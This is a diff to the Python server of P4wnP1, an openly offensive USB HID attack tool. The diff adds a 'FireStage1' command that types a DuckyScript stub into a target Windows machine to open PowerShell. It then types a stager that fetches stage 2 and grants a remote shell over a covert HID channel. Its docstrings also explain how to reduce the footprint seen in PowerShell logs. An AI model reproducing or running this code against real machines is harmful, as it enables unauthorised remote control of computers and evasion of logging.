@@ -21,7 +21,7 @@ class P4wnP1(cmd.Cmd):
 	... maybe not, who knows ?!
 	"""
 
-	DEBUG=False
+	DEBUG=True
 
 	# message types from CLIENT (powershell) to server (python)
 	CTRL_MSG_FROM_CLIENT_RESERVED = 0
@@ -31,7 +31,8 @@ class P4wnP1(cmd.Cmd):
 	CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4 # response from a method ran on client
 	CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
 	CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6 # client tasks server to run a method
-	CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7 
+	CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7
+	CTRL_MSG_FROM_CLIENT_PROCESS_EXITED = 8
 
 	# message types from server (python) to client (powershell)
 	CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000
@@ -76,6 +77,8 @@ Web: https://github.com/mame82/P4wnP1
 State: Experimental (maybe forever ;-))
 
 Enter "help" for help
+Enter "FireStage1" to run stage 1 against the current target.
+Use "help FireStage1" to get more details.
 ================================='''
 
 	@staticmethod
@@ -116,6 +119,9 @@ Enter "help" for help
 				interacting = False
 				print "Client disconnected, stop interacting"
 				break
+			if proc.hasExited:
+				print "Process exited... stopping interaction"
+				break
 
 			try:
 				#input = getpass.getpass()
@@ -138,6 +144,16 @@ Enter "help" for help
 
 		P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))
 
+	
+	def onClientProcessExitted(self, payload):
+		# fetch proc id
+		proc_id = struct.unpack("!I", payload)[0]
+		proc = self.client.getProcess(proc_id)
+		if proc:
+			proc.hasExited = True
+			print "Proc with id {0} exited".format(proc_id)
+			self.client.removeProc(proc_id)
+	
 	def get_next_method_id(self):
 		next = self._next_client_method_id
 		# increase next_method id and cap to 0xFFFFFFFF
@@ -224,17 +240,18 @@ Enter "help" for help
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE:
 						# handle method response
 						self.client.deliverMethodResponse(payload)
-					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_OS_INFO:
-						self.client.setOSInfo(payload)
-					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
-						self.client.setPSVersion(payload)
+					#elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_OS_INFO:
+						#self.client.setOSInfo(payload)
+					#elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
+						#self.client.setPSVersion(payload)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
 						self.addChannel(payload)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE:
 						print "Client received kill request and tries to terminate."
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
 						print "Run method request with following payload received: {0} ".format(repr(payload))
-
+					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_PROCESS_EXITED:
+						self.onClientProcessExitted(payload)
 					else:
 						P4wnP1.print_debug("indata: Control channel, unknown control message type: {0}, payload: {1} ".format(msg_type, repr(payload)))
 
@@ -281,6 +298,58 @@ Enter "help" for help
 
 	def killCLient(self):
 		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
+	
+	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000):
+		'''
+		Triggers Stage 1 either with pure PowerShell using reflections (trigger_type = 1)
+		or with PowerShell invoking a .NET assembly, running stage1 (trigger_type = 2)
+		
+		trigger_type 1:
+		  Is faster, because less keys have to be printed out. As the PowerShell
+		  isn't cpable of reading serial and manufacturer of a USB HID composite device, PID
+		  and VID have to be prepended in front of the payload.
+		  
+		trigger_type 2:
+		  Is slower, because around 6000 chars have to be printed to build the needed assembly. 
+		  There's no need to account on PID and VID, as the code is using the device serial "deadbeefdeadbeef"
+		  and the manufacturer "MaMe82".
+		'''
+	
+		gadget_dir = "/sys/kernel/config/usb_gadget/mame82gadget/"
+		
+		ps_stub ='''
+	                GUI r
+	                DELAY 500
+	                STRING powershell.exe
+	                ENTER
+	        '''		
+		ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
+		
+		ps_script = ""
+		
+		if trigger_type == 1:
+			# read PID and VID
+			pid=""
+			with open(gadget_dir+"idProduct","r") as f:
+				pid=f.read()
+				pid=(pid[2:6]).upper()
+				
+			vid=""
+			with open(gadget_dir+"idVendor","r") as f:
+				vid=f.read()
+				vid=(vid[2:6]).upper()
+				
+			ps_script = "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
+			
+			with open("Stage1.ps1","rb") as f:	
+				ps_script += StageHelper.out_PS_IEX_Invoker(f.read())
+		elif trigger_type == 2:
+			ps_script = StageHelper.out_PS_Stage1_invoker("Stage1.dll")
+					
+		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
+		self.duckencoder.outhidStringDirect(ps_script + ";exit\n") # print stage1 PowerShell script			
+		
+		
 	
 	###################
 	# caller methods and handlers for remote client methods
@@ -415,54 +484,101 @@ Enter "help" for help
 
 	def do_shell(self, line):
 		if not self.client.isConnected():
-			print "Not possible, client not connected"
+			print "Not possible... Run 'FireStage1' first, to get the target connected"
 			return
 		self.client_call_create_shell_proc()
 
 		
-	def do_run_method(self, line):
-		if " " in line:
-			method_name, method_args = line.split(" ",1)
-		else:
-			method_name = line
-			method_args = ""
+	#def do_run_method(self, line):
+		#if " " in line:
+			#method_name, method_args = line.split(" ",1)
+		#else:
+			#method_name = line
+			#method_args = ""
 
-		self.client.callMethod(method_name, method_args, self.handler_client_method_response)
+		#self.client.callMethod(method_name, method_args, self.handler_client_method_response)
 		
 	def do_SendKeys(self, line):
 		'''
-		Prints out everything on target through HID keyboard. Be sure to set the correct keyboard language for your target.
-		'''
+	Prints out everything on target through HID keyboard. Be sure
+	to set the correct keyboard language for your target  (use 
+	'GetKeyboardLanguage' and 'SetKeyboardLanguage' commands.).
+	'''
 		self.duckencoder.outhidStringDirect(line)
 	
-	def do_TriggerStage1(self, line):
+	def do_FireStage1(self, line):
 		'''
-		Triggers stage 1 via HID attack. Be sure to have coorect target keyboard language set.
-		'''
-		#time.sleep(3)
-		ps_stub ='''
-			GUI r
-			DELAY 500
-			STRING powershell.exe
-			ENTER
-			DELAY 1000
-		'''
-		
-		ps_script = StageHelper.out_PS_Stage1_invoker("Stage1.dll")
-				
-		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
-		self.duckencoder.outhidStringDirect(ps_script + "\n") # print stage1 PowerShell script
+	usage: FireStage1 <trigger_type> <trigger_delay in milliseconds>
 	
-	def do_SetTargetKeyboardLanguage(self, line):
+	Fires stage 1 via HID keyboard against a PowerShell process
+	on a Windows client.
+	The code downloads stage 2 and after successfull execution 
+	commands like "shell" could be used, to get a remote shell 
+	(communictaing through HID covert channel only).
+	
+	THE KEYBOARD LANGUAGE HAS TO BE SET ACCORDING TO THE TARGETS 
+	KEYBOARD LAYOUT, TO MAKE THIS WORK (use 'GetKeyboardLanguage' 
+	and 'SetKeyboardLanguage' commands.)
+	
+	
+	trigger_type = 1 (default):
+	  Is faster, because less keys have to be printed out. As the
+	  PowerShell script isn't capable of reading serial and 
+	  manufacturer of a USB HID composite device, PID  and VID have 
+	  to be prepended in front of the payload. This leaves a larger 
+	  footprint.
+	  
+	trigger_type = 2:
+	  Is slower, because around 6000 chars have to be printed to 
+	  build the needed assembly. There's no need to account on PID 
+	  and VID, as the code is using the device serial "deadbeef
+	  deadbeef" and the manufacturer "MaMe82". These are hardcoded
+	  in the assembly, and leave a smaller footprint (not ad-hoc 
+	  readable, if powershell script content is logged).
+	  
+	trigger_delay (default 1000):
+	  The payload is started by running powershell.exe and directly
+	  entering the script with HID keyboard.
+	  This part is critical, as if keystrokes get lost the initial
+	  stage won't execute. This could be caused by user interaction
+	  during stage 1 typeout or due to PowerShell.exe starting too
+	  slow and thus getting ready for keyboard input too late. 
+	  The latter case could be handled by increasing the trigger delay,
+	  to give the target host more time between start of powershell
+	  nd start of typing out stage1.
+	  The value defaults to 1000 ms if omitted.'''
+		
+		arg_error="Wrong arguments given"
+		trigger_type = 1
+		trigger_delay_ms = 1000
+		args = line.split(" ")
+		if len(args) == 1 and len(line) > 0:
+			try:
+				trigger_type = int(args[0])
+			except ValueError:
+				print arg_error
+		elif len(args) == 2:
+			try:
+				trigger_type = int(args[0])
+				trigger_delay_ms = int(args[1])
+			except ValueError:
+				print arg_error
+		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms)	
+				
+		
+	def do_SetKeyboardLanguage(self, line):
 		'''
-		Sets the language for target keyboard interaction
-		'''
+	Sets the language for target keyboard interaction.
+	Possible values: 
+	  be, br, ca, ch, de, dk, es, fi, fr, gb, hr, it,
+	  no, pt, ru, si, sv, tr, us
+	'''
 		print self.duckencoder.setLanguage(line.lower())
 		
-	def do_GetTargetKeyboardLanguage(self, line):
+	def do_GetKeyboardLanguage(self, line):
 		'''
-		Gets the language for target keyboard interaction
-		'''
+	Shows which language is set for HID keyboard.
+	'''
 		print self.duckencoder.getLanguage()
 
 	def do_interact(self, line):
@@ -495,10 +611,9 @@ Enter "help" for help
 		self.client.print_state()
 	def do_echotest(self, line):
 		'''
-		This is a test of calling a remote method on the client and wait for the result to get delivered
-		The remote Powershell method itself is "core_echo" which sends back all arguments given.
-		The response is handled by "handler_client_echotest()"
-		'''
+	If the client is connected, command arguments given should be reflected back.
+	Communications happen through a pure HID covert channel.
+	'''
 		
 		self.client_call_echo(line)
 
